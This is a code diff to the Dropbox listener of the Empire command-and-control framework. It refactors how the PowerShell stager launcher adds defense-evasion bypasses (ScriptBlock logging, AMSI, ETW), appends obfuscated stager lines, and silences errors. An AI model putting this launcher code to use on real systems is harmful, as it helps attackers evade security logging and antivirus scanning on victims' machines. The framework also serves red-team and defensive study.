@@ -7,6 +7,7 @@ import os
 import time
 from builtins import object
 from builtins import str
+from typing import List
 
 import dropbox
 # from dropbox.exceptions import ApiError, AuthError
@@ -14,11 +15,10 @@ import dropbox
 from pydispatch import dispatcher
 
 from empire.server.common import encryption
-# Empire imports
 from empire.server.common import helpers
 from empire.server.common import obfuscation
 from empire.server.common import templating
-from empire.server.common import bypasses
+from empire.server.utils import data_util
 
 
 class Listener(object):
@@ -131,7 +131,7 @@ class Listener(object):
         # optional/specific for this module
 
         # set the default staging key to the controller db default
-        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
+        self.options['StagingKey']['Value'] = str(data_util.get_config('staging_key')[0])
 
 
     def default_response(self):
@@ -156,10 +156,13 @@ class Listener(object):
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
+                          proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
+                          listenerName=None, bypasses: List[str]=None):
         """
         Generate a basic launcher for the specified listener.
         """
+        bypasses = [] if bypasses is None else bypasses
 
         if not language:
             print(helpers.color('[!] listeners/dbx generate_launcher(): no language specified!'))
@@ -187,15 +190,8 @@ class Listener(object):
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-                    # ScriptBlock Logging bypass
-                    if scriptLogBypass:
-                        stager += bypasses.scriptBlockLogBypass()
-                    # @mattifestation's AMSI bypass
-                    if AMSIBypass:
-                        stager += bypasses.AMSIBypass()
-                    # rastamouse AMSI bypass
-                    if AMSIBypass2:
-                        stager += bypasses.AMSIBypass2()
+                    for bypass in bypasses:
+                        stager += bypass
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
